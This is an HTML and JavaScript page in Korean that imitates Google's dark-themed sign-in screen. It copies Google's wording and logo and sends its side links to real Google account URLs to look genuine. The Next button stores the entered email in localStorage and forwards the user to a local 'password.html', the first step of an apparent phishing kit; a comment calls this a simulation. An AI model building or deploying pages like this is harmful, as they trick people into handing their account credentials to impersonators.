<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google 로그인</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
    }

    .container {
      max-width: 360px;
      width: 90%;
      margin: 80px auto;
      padding: 20px;
       background-color: #1e1e1e;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
    }

    h1 {
      font-size: 28px;
      margin-bottom: 10px;
       text-align: center;
    }

    p {
      color: #aaa;
      font-size: 14px;
       text-align: left;
       margin-bottom: 20px;
    }

    a {
      color: #8ab4f8;
      text-decoration: none;
    }

    input[type="text"] {
      width: calc(100% - 24px);
      padding: 12px;
      margin: 20px 0 5px 0;
      border: 1px solid #555;
      border-radius: 4px;
      background-color: #121212;
      color: white;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.3s ease;
    }

    .input-blue-border {
        border-color: #1a73e8 !important;
        outline: none;
        box-shadow: 0 0 0 0.1rem rgba(26, 115, 232, 0.25);
    }
    .input-red-border {
        border-color: #f28b82 !important;
        outline: none;
        box-shadow: 0 0 0 0.1rem rgba(242, 139, 130, 0.25);
    }


    .btn-next {
      float: right;
      background-color: #8ab4f8;
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
       transition: background-color 0.3s ease;
    }

     .btn-next:hover {
       background-color: #6aa5e8;
     }


    .links {
      margin-top: 10px;
       text-align: left;
       position: relative;
    }

    .links a {
      display: block;
      margin-top: 10px;
       font-size: 14px;
       margin-right: 0;
       vertical-align: top;
    }


     .container img {
         display: block;
         margin: 0 auto 20px auto;
     }

    .error-message {
        color: #f28b82;
        font-size: 12px;
        margin-top: 5px;
        margin-bottom: 15px;
        text-align: left;
        min-height: 15px;
        display: none;
    }

    .dropdown {
         display: block !important;
         margin-top: 10px;
    }

    .dropdown-toggle {
        color: #8ab4f8 !important;
        background-color: transparent !important;
        border: none !important;
        padding: 0 !important;
        font-size: 14px !important;
        cursor: pointer !important;
        text-align: left !important;
        box-shadow: none !important;
        outline: none !important;
    }

    .dropdown-toggle::after {
        display: none !important;
    }

    .dropdown-menu {
        background-color: #1e1e1e !important;
        border: 1px solid #555 !important;
        padding: 5px 0 !important;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5) !important;
         top: 100% !important;
         left: 0 !important;
         margin-top: 0 !important;
    }

    .dropdown-menu .dropdown-item {
        color: white !important;
        font-size: 14px !important;
        padding: 8px 15px !important;
        transition: background-color 0.2s ease;
    }

    .dropdown-menu .dropdown-item:hover,
    .dropdown-menu .dropdown-item:focus {
        background-color: #333 !important;
        color: white !important;
    }

    .dropdown-menu .dropdown-divider {
        border-top: 1px solid #555 !important;
    }


  </style>
</head>
<body>
  <div class="container">
    <img src="google-dark-background-hero-Photoroom.png" alt="Google" width="160" height="90">
    <h1>로그인</h1>
    <input type="text" id='email' placeholder="이메일 또는 휴대전화">
    <div class="links">
      <a href="#" id="forgotEmailLink">이메일을 잊으셨나요?</a>
      <br>
      <p class="link-text">
        Google 계정을 사용하세요. 계정이 이 기기에 추가되어 다른 Google 앱에서 사용할 수 있게 됩니다. 
        <a href="#" id="learnMoreLink">계정 사용에 관해 자세히 알아보기</a>
      </p>
      </br>

      <div class="link-row">
        <button class="btn-next">다음</button>
        
        <div class="dropdown">
          <button class="btn btn-secondary dropdown-toggle" type="button" id="createAccountDropdownButton" data-bs-toggle="dropdown" aria-expanded="false">
            계정 만들기
          </button>
          <ul class="dropdown-menu" aria-labelledby="createAccountDropdownButton">
            <li><a class="dropdown-item create-option" href="#">개인용</a></li>
            <li><a class="dropdown-item create-option" href="#">자녀 계정</a></li>
            <li><a class="dropdown-item create-option" href="#">직장 또는 비즈니스용</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      localStorage.setItem("save",'');
      
      const emailInput = document.querySelector('input[type="text"]');
      const nextButton = document.querySelector('.btn-next');
      const forgotEmailLink = document.getElementById('forgotEmailLink');
      const learnMoreLink = document.getElementById('learnMoreLink');
      const createOptionLinks = document.querySelectorAll('.dropdown-menu .dropdown-item.create-option');

      const errorMessageDiv = document.createElement('div');
      errorMessageDiv.classList.add('error-message');
      emailInput.parentNode.insertBefore(errorMessageDiv, emailInput.nextSibling);

      // 로컬 스토리지에 저장된 값 가져오기
      let value = localStorage.getItem('save');

      // 값이 있으면 입력 필드에 표시, 없으면 기본 placeholder 유지
      if (value) {
        emailInput.value = value;
      } else {
        emailInput.placeholder = "이메일 또는 휴대전화";
      }

      emailInput.focus();
      emailInput.classList.add('input-blue-border');

      emailInput.addEventListener('focus', function() {
          emailInput.classList.add('input-blue-border');
          emailInput.classList.remove('input-red-border');
          errorMessageDiv.style.display = 'none';
          errorMessageDiv.textContent = '';
      });

       emailInput.addEventListener('blur', function() {
            if (emailInput.value.trim() === '') {
                 emailInput.classList.remove('input-blue-border');
            }
       });

      nextButton.addEventListener('click', function() {
        const emailValue = emailInput.value.trim();

        if (emailValue === '') {
          emailInput.classList.add('input-red-border');
          emailInput.classList.remove('input-blue-border');
          errorMessageDiv.textContent = '! 이메일이나 전화번호를 입력하세요.';
          errorMessageDiv.style.display = 'block';
        } else {
          emailInput.classList.remove('input-red-border');
          emailInput.classList.add('input-blue-border');
          errorMessageDiv.style.display = 'none';
          errorMessageDiv.textContent = '';
          let email = document.getElementById("email").value;
          localStorage.setItem("email", email);
          window.location.href = "password.html";
          // 실제 다음 단계로 넘어가는 시뮬레이션 코드를 여기에 넣으면 됨
        }
      });

       emailInput.addEventListener('keypress', function(event) {
          if (event.key === 'Enter') {
              event.preventDefault();
              nextButton.click();
          }
       });

      forgotEmailLink.addEventListener('click', function(event) {
        event.preventDefault();
        window.location.href = 'https://accounts.google.com/signin/v2/usernamerecovery?authuser=0&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S-1509154102%3A1749034980027542&ec=GAlAAQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=ko';
      });

       createOptionLinks.forEach(link => {
           link.addEventListener('click', function(event) {
               event.preventDefault();

               const selectedOption = event.target.textContent;
               let redirectUrl = '';

               if (selectedOption === '개인용') {
                   redirectUrl = 'https://accounts.google.com/lifecycle/steps/signup/name?continue=http://support.google.com/chrome/answer/6130773?hl%3Dko&dsh=S-332186864:1749054698272157&ec=GAZAdQ&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ko&ifkv=AdBytiO--pKFs0P2kYhC1CFAbMrQw6q3Q6g5fC0zKPd8cPA3Gd-Gmqhf0dDUnccZUgDBPfKv3XirUw&TL=ALgCv6zIEcP4ip7gUVFmZ9n46g8OJP3g-h1a2ugCkTlwxXBaS9KCMzSkVAG4TI_0';
               } else if (selectedOption === '자녀 계정') {
                   redirectUrl = 'https://accounts.google.com/signup/v2/kidaccountinfo?continue=http%3A%2F%2Fsupport.google.com%2Fchrome%2Fanswer%2F6130773%3Fhl%3Dko&dsh=S-332186864%3A1749054698272157&ec=GAZAdQ&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=ko&ifkv=AdBytiPYFSnR75ASV-AEmrVDYwgAEXiJpC8UefaNVSFQoVrUlt-tQ2HyZiGfv6PFsmB56REc13RVhA';
               } else if (selectedOption === '직장 또는 비즈니스용') {
                   redirectUrl = 'https://accounts.google.com/lifecycle/steps/signup/workspaceinterstitial?continue=http://support.google.com/chrome/answer/6130773?hl%3Dko&dsh=S-332186864:1749054698272157&ec=GAZAdQ&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ko&ifkv=AdBytiO--pKFs0P2kYhC1CFAbMrQw6q3Q6g5fC0zKPd8cPA3Gd-Gmqhf0dDUnccZUgDBPfKv6yrs23g8Ovy4nrTx7_rNqBgarlrs86sgGTKNt_eRN5K-zk7MJmPYqMtCVNL';
               }

               if (redirectUrl) {
                   window.location.href = redirectUrl;
               } else {
                   alert('알 수 없는 계정 유형 선택: ' + selectedOption);
               }
           });
       });

       learnMoreLink.addEventListener('click', function(event) {
           event.preventDefault();
           window.location.href = 'https://support.google.com/chrome/answer/6130773?hl=ko';
       });
    });
  </script>
</body>
</html>
